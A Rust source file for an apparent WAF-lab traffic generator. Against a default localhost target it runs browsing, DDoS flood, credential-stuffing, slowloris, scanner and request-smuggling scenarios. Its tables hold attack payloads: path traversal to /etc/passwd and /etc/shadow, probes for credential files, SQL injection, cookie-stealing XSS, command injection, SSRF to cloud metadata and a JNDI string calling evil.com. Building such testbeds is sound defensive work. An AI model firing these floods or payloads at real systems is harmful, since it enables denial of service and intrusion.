//! HTTP traffic generator with configurable TLS ClientHello profiles.
//!
//! Drives multi-phase scenarios (warmup → attack → calm) with named TLS
//! profiles that control exact cipher suite lists and extension ordering.
//! Uses hyper + tokio-rustls directly so we control the raw TLS ClientHello.
//!
//! Patterns:
//!   browse       — generic browser-like GET traffic
//!   dvwa_browse  — authenticated DVWA browsing (rich baseline for manifold)
//!   get_flood    — volumetric GET flood
//!   post_flood   — volumetric POST flood
//!   credential_stuff — credential stuffing POST
//!   scraper      — web scraper
//!   slowloris    — slow read/write
//!   scanner      — Nikto/Nuclei/ZAP-style vulnerability probes
//!   smuggle      — HTTP request smuggling signatures

use std::net::SocketAddr;
use std::sync::Arc;
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::{Duration, Instant};

use anyhow::Result;
use clap::Parser;
use rand::prelude::*;
use rustls::ClientConfig;
use serde::Deserialize;
use tokio::net::TcpStream;
use tokio::sync::{Mutex, Semaphore};
use tokio::time::sleep;
use tokio_rustls::TlsConnector;
use tracing::info;
use tracing_subscriber::{EnvFilter, fmt};

// =============================================================================
// CLI
// =============================================================================

#[derive(Parser, Debug)]
#[command(name = "http-generator", about = "HTTP WAF lab traffic generator")]
struct Args {
    /// Target proxy address
    #[arg(long, default_value = "127.0.0.1:8443")]
    target: SocketAddr,

    /// Target host header
    #[arg(long, default_value = "localhost")]
    host: String,

    /// Scenario file (JSON); if absent, runs a built-in DDoS demo scenario
    #[arg(long)]
    scenario: Option<String>,

    /// Skip TLS certificate verification (for self-signed certs)
    #[arg(long, default_value_t = true)]
    insecure: bool,
}

// =============================================================================
// Scenario types
// =============================================================================

#[derive(Debug, Deserialize)]
struct Scenario {
    phases: Vec<Phase>,
}

#[derive(Debug, Deserialize)]
struct Phase {
    name: String,
    duration_s: u64,
    rps: u32,
    pattern: String,
    #[serde(default)]
    path: Option<String>,
    #[serde(default = "default_tls_profiles")]
    tls_profiles: Vec<String>,
}

fn default_tls_profiles() -> Vec<String> {
    vec!["chrome_120".to_string(), "firefox_121".to_string()]
}

// =============================================================================
// TLS profiles
// =============================================================================

/// A named TLS profile controls what cipher suites, protocol versions, and
/// ALPN the client advertises.  For DDoS simulation the key discriminator is
/// using a uniform profile for all flood connections vs. varied profiles for
/// legitimate traffic.
///
/// Profiles can restrict to TLS 1.2 only (omitting TLS 1.3 ciphers from the
/// ClientHello) and/or drop ChaCha ciphers, producing a visibly different
/// fingerprint across cipher_suites, extensions, and supported_versions.
#[derive(Debug, Clone)]
struct TlsProfile {
    #[allow(dead_code)]
    name: String,
    alpn: Vec<Vec<u8>>,
    shuffle_ciphers: bool,
    tls12_only: bool,
    /// Keep only AES-GCM cipher suites (drop ChaCha20-Poly1305).
    aes_only: bool,
}

fn get_tls_profile(name: &str) -> TlsProfile {
    match name {
        "chrome_120" => TlsProfile {
            name: name.to_string(),
            alpn: vec![b"h2".to_vec(), b"http/1.1".to_vec()],
            shuffle_ciphers: false,
            tls12_only: false,
            aes_only: false,
        },
        "firefox_121" => TlsProfile {
            name: name.to_string(),
            alpn: vec![b"h2".to_vec(), b"http/1.1".to_vec()],
            shuffle_ciphers: false,
            tls12_only: false,
            aes_only: false,
        },
        "curl_800" => TlsProfile {
            name: name.to_string(),
            alpn: vec![b"http/1.1".to_vec()],
            shuffle_ciphers: false,
            tls12_only: true,
            aes_only: true,
        },
        "python_requests" => TlsProfile {
            name: name.to_string(),
            alpn: vec![],
            shuffle_ciphers: false,
            tls12_only: false,
            aes_only: true,
        },
        "bot_shuffled" => TlsProfile {
            name: name.to_string(),
            alpn: vec![b"http/1.1".to_vec()],
            shuffle_ciphers: true,
            tls12_only: true,
            aes_only: false,
        },
        _ => TlsProfile {
            name: name.to_string(),
            alpn: vec![b"http/1.1".to_vec()],
            shuffle_ciphers: false,
            tls12_only: false,
            aes_only: false,
        },
    }
}

fn build_tls_config(profile: &TlsProfile, insecure: bool) -> Arc<ClientConfig> {
    let mut p = rustls::crypto::ring::default_provider();

    if profile.aes_only {
        p.cipher_suites.retain(|cs| {
            let name = format!("{:?}", cs.suite());
            !name.contains("CHACHA")
        });
    }

    if profile.shuffle_ciphers {
        p.cipher_suites.shuffle(&mut rand::thread_rng());
    }

    let provider = Arc::new(p);

    let mut root_store = rustls::RootCertStore::empty();
    root_store.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());

    let versions: Vec<&'static rustls::SupportedProtocolVersion> = if profile.tls12_only {
        vec![&rustls::version::TLS12]
    } else {
        vec![&rustls::version::TLS13, &rustls::version::TLS12]
    };

    let builder = ClientConfig::builder_with_provider(provider)
        .with_protocol_versions(&versions)
        .expect("valid TLS versions")
        .with_root_certificates(root_store);

    let mut config = builder.with_no_client_auth();
    config.alpn_protocols = profile.alpn.clone();

    if insecure {
        config.dangerous().set_certificate_verifier(Arc::new(AcceptAnyCert));
    }

    Arc::new(config)
}

// =============================================================================
// Request patterns — data tables
// =============================================================================

static USER_AGENTS_LEGIT: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
];

static USER_AGENTS_FLOOD: &[&str] = &[
    "curl/8.0.1",
    "python-requests/2.31.0",
    "Go-http-client/1.1",
    "libwww-perl/6.72",
];

static USER_AGENTS_SCANNER: &[&str] = &[
    "Nikto/2.1.6",
    "sqlmap/1.7.2#stable",
    "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
    "OWASP ZAP/2.14.0",
    "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
    "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)",
    "Wfuzz/3.1.0",
    "gobuster/3.6",
];

static LEGIT_PATHS: &[&str] = &[
    "/", "/index.html", "/about", "/contact",
    "/blog", "/products", "/api/status", "/api/v1/health",
];

// DVWA application pages — weighted towards navigation pages
static DVWA_NAV_PATHS: &[&str] = &[
    "/",
    "/index.php",
    "/instructions.php",
    "/about.php",
    "/security.php",
    "/setup.php",
    "/phpinfo.php",
];

static DVWA_VULN_PATHS: &[&str] = &[
    "/vulnerabilities/sqli/",
    "/vulnerabilities/sqli_blind/",
    "/vulnerabilities/xss_r/",
    "/vulnerabilities/xss_s/",
    "/vulnerabilities/xss_d/",
    "/vulnerabilities/exec/",
    "/vulnerabilities/fi/",
    "/vulnerabilities/upload/",
    "/vulnerabilities/csrf/",
    "/vulnerabilities/brute/",
    "/vulnerabilities/captcha/",
    "/vulnerabilities/weak_id/",
    "/vulnerabilities/javascript/",
    "/vulnerabilities/csp/",
    "/vulnerabilities/open_redirect/",
];

// Legitimate form submissions for DVWA pages (path, query_string)
static DVWA_FORM_SUBMISSIONS: &[(&str, &str)] = &[
    ("/vulnerabilities/sqli/", "id=1&Submit=Submit"),
    ("/vulnerabilities/sqli/", "id=2&Submit=Submit"),
    ("/vulnerabilities/sqli/", "id=3&Submit=Submit"),
    ("/vulnerabilities/sqli_blind/", "id=1&Submit=Submit"),
    ("/vulnerabilities/xss_r/", "name=John&Submit=Submit"),
    ("/vulnerabilities/xss_r/", "name=Alice&Submit=Submit"),
    ("/vulnerabilities/xss_r/", "name=TestUser&Submit=Submit"),
    ("/vulnerabilities/exec/", "ip=192.168.1.1&Submit=Submit"),
    ("/vulnerabilities/exec/", "ip=10.0.0.1&Submit=Submit"),
    ("/vulnerabilities/exec/", "ip=127.0.0.1&Submit=Submit"),
    ("/vulnerabilities/brute/", "username=admin&password=password&Login=Login"),
    ("/vulnerabilities/fi/", "page=include.php"),
    ("/vulnerabilities/fi/", "page=file1.php"),
    ("/vulnerabilities/csrf/", "password_new=test&password_conf=test&Change=Change"),
    ("/vulnerabilities/open_redirect/", "redirect=info.php"),
];

// Scanner exploit paths — structurally alien to any normal web app
static SCANNER_PATHS: &[&str] = &[
    // Path traversal
    "/../../../etc/passwd",
    "/..%2f..%2f..%2fetc/shadow",
    "/....//....//....//etc/passwd",
    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    // Admin panels
    "/wp-admin/",
    "/wp-login.php",
    "/administrator/",
    "/admin/",
    "/phpmyadmin/",
    "/manager/html",
    "/solr/admin/",
    "/jenkins/",
    // Dotfiles and configs
    "/.env",
    "/.git/config",
    "/.git/HEAD",
    "/.htaccess",
    "/.htpasswd",
    "/.aws/credentials",
    "/.docker/config.json",
    "/.ssh/id_rsa",
    // Backup files
    "/backup.sql",
    "/db.sql.gz",
    "/wp-config.php.bak",
    "/web.config.old",
    "/config.php.save",
    "/dump.sql",
    // Info leaks
    "/server-status",
    "/server-info",
    "/debug/vars",
    "/debug/pprof/",
    "/actuator/env",
    "/actuator/health",
    // API probing
    "/api/v1/users",
    "/api/v1/admin",
    "/graphql",
    "/console",
    "/swagger.json",
    "/api-docs",
    // Classic CGI
    "/cgi-bin/test-cgi",
    "/cgi-bin/printenv.pl",
    "/cgi-bin/php",
];

static SCANNER_QUERIES: &[&str] = &[
    "id=1%27%20OR%20%271%27%3D%271",
    "id=1%27%20OR%20%271%27%3D%271%27--",
    "search=1%20UNION%20SELECT%201,2,3--",
    "search=1;%20DROP%20TABLE%20users--",
    "q=%3Cscript%3Ealert(1)%3C/script%3E",
    "q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
    "q=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E",
    "cmd=;cat%20/etc/passwd",
    "cmd=|ls%20-la",
    "cmd=%60id%60",
    "file=../../../../etc/passwd",
    "file=....//....//....//etc/shadow",
    "page=php://filter/convert.base64-encode/resource=index",
    "url=http://169.254.169.254/latest/meta-data/",
    "redirect=http://evil.com",
    "template=%7B%7B7*7%7D%7D",
    "search=%24%7Bjndi:ldap://evil.com/x%7D",
];

struct ExoticHeader {
    name: &'static str,
    value: &'static str,
}

static SCANNER_EXOTIC_HEADERS: &[ExoticHeader] = &[
    ExoticHeader { name: "X-Original-URL", value: "/admin" },
    ExoticHeader { name: "X-Rewrite-URL", value: "/secret" },
    ExoticHeader { name: "X-Forwarded-Host", value: "evil.com" },
    ExoticHeader { name: "X-Forwarded-For", value: "127.0.0.1" },
    ExoticHeader { name: "X-Custom-IP-Authorization", value: "127.0.0.1" },
    ExoticHeader { name: "X-Originating-IP", value: "127.0.0.1" },
    ExoticHeader { name: "X-Remote-IP", value: "127.0.0.1" },
    ExoticHeader { name: "X-Client-IP", value: "127.0.0.1" },
    ExoticHeader { name: "X-Real-IP", value: "127.0.0.1" },
    ExoticHeader { name: "Referer", value: "https://evil.com/exploit" },
    ExoticHeader { name: "X-Forwarded-Proto", value: "http" },
    ExoticHeader { name: "X-Http-Method-Override", value: "PUT" },
    ExoticHeader { name: "X-Method-Override", value: "DELETE" },
    ExoticHeader { name: "X-ProxyUser-Ip", value: "127.0.0.1" },
];

// =============================================================================
// Request patterns — builder
// =============================================================================

struct RequestSpec {
    method: &'static str,
    path: String,
    user_agent: String,
    extra_headers: Vec<(&'static str, String)>,
}

fn build_request(pattern: &str, path_override: Option<&str>, rng: &mut impl Rng) -> RequestSpec {
    match pattern {
        "dvwa_browse" => build_dvwa_browse(rng),
        "scanner" => build_scanner(rng),
        "smuggle" => build_smuggle(rng),
        "get_flood" => RequestSpec {
            method: "GET",
            path: path_override.unwrap_or("/api/search").to_string(),
            user_agent: USER_AGENTS_FLOOD.choose(rng).unwrap().to_string(),
            extra_headers: vec![],
        },
        "post_flood" => RequestSpec {
            method: "POST",
            path: path_override.unwrap_or("/api/submit").to_string(),
            user_agent: USER_AGENTS_FLOOD.choose(rng).unwrap().to_string(),
            extra_headers: vec![
                ("Content-Type", "application/x-www-form-urlencoded".to_string()),
                ("Content-Length", "0".to_string()),
            ],
        },
        "credential_stuff" => RequestSpec {
            method: "POST",
            path: path_override.unwrap_or("/api/v1/auth/login").to_string(),
            user_agent: "python-requests/2.31.0".to_string(),
            extra_headers: vec![
                ("Content-Type", "application/json".to_string()),
                ("Content-Length", "0".to_string()),
                ("X-Forwarded-For", format!("10.{}.{}.{}", rng.gen_range(0..255), rng.gen_range(0..255), rng.gen_range(0..255))),
            ],
        },
        "scraper" => RequestSpec {
            method: "GET",
            path: format!("/products/{}", rng.gen_range(1..99999)),
            user_agent: "Scrapy/2.11.0 (+https://scrapy.org)".to_string(),
            extra_headers: vec![],
        },
        "slowloris" => RequestSpec {
            method: "GET",
            path: path_override.unwrap_or("/").to_string(),
            user_agent: "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1)".to_string(),
            extra_headers: vec![
                ("Accept", "*/*".to_string()),
                ("X-Custom-Header", "a]".to_string()),
            ],
        },
        // Default: generic browser browse
        _ => {
            RequestSpec {
                method: "GET",
                path: LEGIT_PATHS.choose(rng).unwrap().to_string(),
                user_agent: USER_AGENTS_LEGIT.choose(rng).unwrap().to_string(),
                extra_headers: vec![
                    ("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8".to_string()),
                    ("Accept-Language", "en-US,en;q=0.9".to_string()),
                ],
            }
        }
    }
}

fn build_dvwa_browse(rng: &mut impl Rng) -> RequestSpec {
    let session_id = "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6";

    // 20% chance of form submission (GET with query params)
    let (path, query) = if rng.gen_bool(0.2) {
        let (p, q) = DVWA_FORM_SUBMISSIONS.choose(rng).unwrap();
        (p.to_string(), Some(q.to_string()))
    } else {
        // 60% navigation pages, 40% vulnerability pages
        let p = if rng.gen_bool(0.6) {
            DVWA_NAV_PATHS.choose(rng).unwrap()
        } else {
            DVWA_VULN_PATHS.choose(rng).unwrap()
        };
        (p.to_string(), None)
    };

    let full_path = match query {
        Some(ref q) => format!("{}?{}", path, q),
        None => path.clone(),
    };

    // Realistic referer from another DVWA page
    let all_pages: Vec<&str> = DVWA_NAV_PATHS.iter()
        .chain(DVWA_VULN_PATHS.iter())
        .copied()
        .collect();
    let referer_path = all_pages.choose(rng).unwrap();
    let referer = format!("https://localhost{}", referer_path);

    RequestSpec {
        method: "GET",
        path: full_path,
        user_agent: USER_AGENTS_LEGIT.choose(rng).unwrap().to_string(),
        extra_headers: vec![
            ("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8".to_string()),
            ("Accept-Language", "en-US,en;q=0.9".to_string()),
            ("Accept-Encoding", "gzip, deflate, br".to_string()),
            ("Referer", referer),
            ("Cookie", format!("PHPSESSID={}; security=low", session_id)),
            ("Connection", "keep-alive".to_string()),
            ("Upgrade-Insecure-Requests", "1".to_string()),
        ],
    }
}

fn build_scanner(rng: &mut impl Rng) -> RequestSpec {
    let base_path = SCANNER_PATHS.choose(rng).unwrap().to_string();

    // 50% chance of appending a query payload
    let path = if rng.gen_bool(0.5) {
        let query = SCANNER_QUERIES.choose(rng).unwrap();
        format!("{}?{}", base_path, query)
    } else {
        base_path
    };

    // Vary the HTTP method (~70% GET, 15% POST, 10% OPTIONS, 5% PUT)
    let method: &'static str = match rng.gen_range(0..20) {
        0..=13 => "GET",
        14..=16 => "POST",
        17..=18 => "OPTIONS",
        _ => "PUT",
    };

    // 2-4 randomly selected exotic headers
    let n_exotic = rng.gen_range(2..=4);
    let mut exotic_indices: Vec<usize> = (0..SCANNER_EXOTIC_HEADERS.len()).collect();
    exotic_indices.shuffle(rng);
    let mut headers: Vec<(&'static str, String)> = exotic_indices.iter()
        .take(n_exotic)
        .map(|&i| {
            let h = &SCANNER_EXOTIC_HEADERS[i];
            (h.name, h.value.to_string())
        })
        .collect();

    if method == "POST" || method == "PUT" {
        headers.push(("Content-Type", "application/x-www-form-urlencoded".to_string()));
        headers.push(("Content-Length", "0".to_string()));
    }

    RequestSpec {
        method,
        path,
        user_agent: USER_AGENTS_SCANNER.choose(rng).unwrap().to_string(),
        extra_headers: headers,
    }
}

fn build_smuggle(rng: &mut impl Rng) -> RequestSpec {
    let paths: &[&str] = &["/", "/index.html", "/api/status", "/login"];
    let path = paths.choose(rng).unwrap().to_string();

    let ua = if rng.gen_bool(0.5) {
        "python-requests/2.31.0"
    } else {
        "Go-http-client/1.1"
    };

    // Each smuggle variant exercises a different smuggling technique
    let variant = rng.gen_range(0..5);
    let mut headers: Vec<(&'static str, String)> = Vec::new();

    match variant {
        0 => {
            // CL-TE conflict
            headers.push(("Content-Length", "0".to_string()));
            headers.push(("Transfer-Encoding", "chunked".to_string()));
        }
        1 => {
            // Obfuscated Transfer-Encoding
            headers.push(("Content-Length", "0".to_string()));
            headers.push(("Transfer-Encoding", " chunked".to_string()));
        }
        2 => {
            // Double Transfer-Encoding
            headers.push(("Transfer-Encoding", "chunked".to_string()));
            headers.push(("Transfer-Encoding", "identity".to_string()));
        }
        3 => {
            // Method override
            headers.push(("X-Http-Method-Override", "PUT".to_string()));
            headers.push(("X-Forwarded-Proto", "http".to_string()));
            headers.push(("Content-Length", "0".to_string()));
        }
        _ => {
            // Chunked with unusual whitespace
            headers.push(("Transfer-Encoding", "chunked, identity".to_string()));
            headers.push(("Content-Length", "0".to_string()));
            headers.push(("X-Forwarded-For", "127.0.0.1".to_string()));
        }
    }

    let method: &'static str = if rng.gen_bool(0.7) { "POST" } else { "GET" };

    RequestSpec {
        method,
        path,
        user_agent: ua.to_string(),
        extra_headers: headers,
    }
}

// =============================================================================
// HTTP request over TLS — with latency tracking
// =============================================================================

static SENT_COUNT: AtomicU64 = AtomicU64::new(0);
static ERROR_COUNT: AtomicU64 = AtomicU64::new(0);
static STATUS_2XX: AtomicU64 = AtomicU64::new(0);
static STATUS_403: AtomicU64 = AtomicU64::new(0);
static STATUS_429: AtomicU64 = AtomicU64::new(0);
static STATUS_OTHER: AtomicU64 = AtomicU64::new(0);

/// Latency samples collected from all connections, in microseconds.
type LatencyCollector = Arc<Mutex<Vec<u64>>>;

/// Send multiple HTTP requests over a single TLS connection.
/// Pushes per-request latency (microseconds) into the collector.
async fn send_requests_on_conn(
    target: SocketAddr,
    host: &str,
    specs: Vec<RequestSpec>,
    tls_config: Arc<ClientConfig>,
    latencies: LatencyCollector,
) -> Result<(u64, u64)> {
    use hyper::client::conn::http1::Builder as ClientBuilder;
    use http_body_util::Full;

    let connector = TlsConnector::from(tls_config);
    let stream = TcpStream::connect(target).await?;
    let server_name = rustls::pki_types::ServerName::try_from(host.to_string())?;
    let tls_stream = connector.connect(server_name, stream).await?;

    let io = hyper_util::rt::TokioIo::new(tls_stream);
    let (mut sender, conn) = ClientBuilder::new()
        .handshake(io)
        .await?;

    tokio::spawn(async move { let _ = conn.await; });

    let mut ok = 0u64;
    let mut err = 0u64;
    let mut batch_latencies: Vec<u64> = Vec::with_capacity(specs.len());

    for spec in &specs {
        let mut builder = hyper::Request::builder()
            .method(&*spec.method)
            .uri(&*spec.path)
            .header("Host", host)
            .header("User-Agent", &*spec.user_agent);
        for (k, v) in &spec.extra_headers {
            builder = builder.header(&**k, &**v);
        }
        let req = builder.body(Full::new(bytes::Bytes::new())).unwrap();

        let t0 = Instant::now();
        match sender.send_request(req).await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let _ = resp.into_body().collect().await;
                let elapsed_us = t0.elapsed().as_micros() as u64;
                batch_latencies.push(elapsed_us);
                ok += 1;
                match status {
                    200..=299 => { STATUS_2XX.fetch_add(1, Ordering::Relaxed); }
                    403 => { STATUS_403.fetch_add(1, Ordering::Relaxed); }
                    429 => { STATUS_429.fetch_add(1, Ordering::Relaxed); }
                    _ => { STATUS_OTHER.fetch_add(1, Ordering::Relaxed); }
                }
            }
            Err(_) => {
                err += 1;
                break;
            }
        }
    }

    // Push all latencies in one lock acquisition
    if !batch_latencies.is_empty() {
        latencies.lock().await.extend_from_slice(&batch_latencies);
    }

    Ok((ok, err))
}

use http_body_util::BodyExt;

// =============================================================================
// Per-phase counter snapshot
// =============================================================================

#[derive(Clone, Copy)]
struct CounterSnapshot {
    sent: u64,
    errors: u64,
    s2xx: u64,
    s403: u64,
    s429: u64,
    other: u64,
}

impl CounterSnapshot {
    fn capture() -> Self {
        Self {
            sent: SENT_COUNT.load(Ordering::Relaxed),
            errors: ERROR_COUNT.load(Ordering::Relaxed),
            s2xx: STATUS_2XX.load(Ordering::Relaxed),
            s403: STATUS_403.load(Ordering::Relaxed),
            s429: STATUS_429.load(Ordering::Relaxed),
            other: STATUS_OTHER.load(Ordering::Relaxed),
        }
    }

    fn delta(&self, end: &CounterSnapshot) -> CounterSnapshot {
        CounterSnapshot {
            sent: end.sent.saturating_sub(self.sent),
            errors: end.errors.saturating_sub(self.errors),
            s2xx: end.s2xx.saturating_sub(self.s2xx),
            s403: end.s403.saturating_sub(self.s403),
            s429: end.s429.saturating_sub(self.s429),
            other: end.other.saturating_sub(self.other),
        }
    }
}

fn percentile(sorted: &[u64], pct: f64) -> u64 {
    if sorted.is_empty() {
        return 0;
    }
    let idx = ((pct / 100.0) * (sorted.len() as f64 - 1.0)).round() as usize;
    sorted[idx.min(sorted.len() - 1)]
}

// =============================================================================
// Phase runner
// =============================================================================

/// How many requests to pipeline on one TLS connection before opening a new one.
const REQUESTS_PER_CONN: usize = 50;

async fn run_phase(phase: &Phase, target: SocketAddr, host: &str, insecure: bool) {
    info!(
        "Phase '{}': {} rps for {}s (pattern={}, tls_profiles={:?})",
        phase.name, phase.rps, phase.duration_s, phase.pattern, phase.tls_profiles
    );

    let snap_start = CounterSnapshot::capture();
    let latencies: LatencyCollector = Arc::new(Mutex::new(Vec::new()));

    let end = Instant::now() + Duration::from_secs(phase.duration_s);
    let interval = Duration::from_micros(1_000_000 / phase.rps.max(1) as u64);
    let max_concurrent = (phase.rps as usize / REQUESTS_PER_CONN).max(4).min(500);
    let semaphore = Arc::new(Semaphore::new(max_concurrent));
    let mut rng = rand::thread_rng();
    let mut spawned = 0u64;
    let mut last_report = Instant::now();
    let host_arc = Arc::new(host.to_string());

    while Instant::now() < end {
        let permit = semaphore.clone().acquire_owned().await.unwrap();
        let profile_name = phase.tls_profiles.choose(&mut rng)
            .cloned()
            .unwrap_or_else(|| "chrome_120".to_string());
        let profile = get_tls_profile(&profile_name);
        let tls_config = build_tls_config(&profile, insecure);

        let batch_size = REQUESTS_PER_CONN.min(
            ((end - Instant::now()).as_millis() as usize * phase.rps as usize / 1000)
                .max(1)
                .min(REQUESTS_PER_CONN)
        );
        let specs: Vec<RequestSpec> = (0..batch_size)
            .map(|_| build_request(&phase.pattern, phase.path.as_deref(), &mut rng))
            .collect();
        let host = host_arc.clone();
        let lat = latencies.clone();

        tokio::spawn(async move {
            let _permit = permit;
            match send_requests_on_conn(target, &host, specs, tls_config, lat).await {
                Ok((ok, err)) => {
                    SENT_COUNT.fetch_add(ok, Ordering::Relaxed);
                    ERROR_COUNT.fetch_add(err, Ordering::Relaxed);
                }
                Err(_) => {
                    ERROR_COUNT.fetch_add(1, Ordering::Relaxed);
                }
            }
        });

        spawned += 1;

        if last_report.elapsed() >= Duration::from_secs(5) {
            let snap = CounterSnapshot::capture();
            let d = snap_start.delta(&snap);
            info!(
                "Phase '{}': conns={} | phase: sent={} 2xx={} 403={} 429={} other={} err={}",
                phase.name, spawned, d.sent, d.s2xx, d.s403, d.s429, d.other, d.errors,
            );
            last_report = Instant::now();
        }

        let batch_interval = Duration::from_micros(
            (interval.as_micros() as u64).saturating_mul(batch_size as u64)
        );
        sleep(batch_interval).await;
    }

    // Wait for in-flight tasks to drain
    let _ = semaphore.clone().acquire_many(max_concurrent as u32).await;

    // Compute phase results
    let snap_end = CounterSnapshot::capture();
    let d = snap_start.delta(&snap_end);
    let total = d.s2xx + d.s403 + d.s429 + d.other;
    let pct = |n: u64| if total > 0 { 100.0 * n as f64 / total as f64 } else { 0.0 };

    // Compute latency percentiles
    let mut lat = latencies.lock().await;
    lat.sort_unstable();
    let p50 = percentile(&lat, 50.0);
    let p95 = percentile(&lat, 95.0);
    let p99 = percentile(&lat, 99.0);

    info!(
        "PHASE_RESULT name={} total={} 2xx={} 403={} 429={} other={} err={} \
         2xx%={:.1} 403%={:.1} 429%={:.1} \
         latency_p50={}us latency_p95={}us latency_p99={}us",
        phase.name, total, d.s2xx, d.s403, d.s429, d.other, d.errors,
        pct(d.s2xx), pct(d.s403), pct(d.s429),
        p50, p95, p99,
    );
}

// =============================================================================
// Built-in demo scenario
// =============================================================================

fn demo_scenario() -> Scenario {
    Scenario {
        phases: vec![
            Phase {
                name: "warmup".to_string(),
                duration_s: 30,
                rps: 50,
                pattern: "browse".to_string(),
                path: None,
                tls_profiles: vec!["chrome_120".to_string(), "firefox_121".to_string()],
            },
            Phase {
                name: "ddos-flood".to_string(),
                duration_s: 60,
                rps: 2000,
                pattern: "get_flood".to_string(),
                path: Some("/api/search".to_string()),
                tls_profiles: vec!["curl_800".to_string()],
            },
            Phase {
                name: "calm".to_string(),
                duration_s: 30,
                rps: 50,
                pattern: "browse".to_string(),
                path: None,
                tls_profiles: vec!["chrome_120".to_string(), "firefox_121".to_string()],
            },
        ],
    }
}

// =============================================================================
// Certificate verifier (insecure mode)
// =============================================================================

#[derive(Debug)]
struct AcceptAnyCert;

impl rustls::client::danger::ServerCertVerifier for AcceptAnyCert {
    fn verify_server_cert(
        &self,
        _end_entity: &rustls::pki_types::CertificateDer<'_>,
        _intermediates: &[rustls::pki_types::CertificateDer<'_>],
        _server_name: &rustls::pki_types::ServerName<'_>,
        _ocsp_response: &[u8],
        _now: rustls::pki_types::UnixTime,
    ) -> Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
        Ok(rustls::client::danger::ServerCertVerified::assertion())
    }

    fn verify_tls12_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::pki_types::CertificateDer<'_>,
        _dsa: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn verify_tls13_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::pki_types::CertificateDer<'_>,
        _dsa: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
        rustls::crypto::ring::default_provider().signature_verification_algorithms.supported_schemes()
    }
}

// =============================================================================
// Main
// =============================================================================

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();

    rustls::crypto::ring::default_provider()
        .install_default()
        .expect("Failed to install rustls crypto provider");

    fmt::Subscriber::builder()
        .with_env_filter(EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("info")))
        .with_target(false)
        .compact()
        .init();

    let scenario = if let Some(path) = &args.scenario {
        let content = std::fs::read_to_string(path)?;
        serde_json::from_str(&content)?
    } else {
        info!("No scenario file provided — using built-in DDoS demo scenario");
        demo_scenario()
    };

    info!(
        target = %args.target,
        host = %args.host,
        phases = scenario.phases.len(),
        "HTTP generator starting"
    );

    for phase in &scenario.phases {
        run_phase(phase, args.target, &args.host, args.insecure).await;
    }

    // Final summary
    let total_sent = SENT_COUNT.load(Ordering::Relaxed);
    let total_errors = ERROR_COUNT.load(Ordering::Relaxed);
    let s2xx = STATUS_2XX.load(Ordering::Relaxed);
    let s403 = STATUS_403.load(Ordering::Relaxed);
    let s429 = STATUS_429.load(Ordering::Relaxed);
    info!(
        "FINAL_SUMMARY sent={} errors={} 2xx={} 403={} 429={}",
        total_sent, total_errors, s2xx, s403, s429,
    );
    Ok(())
}
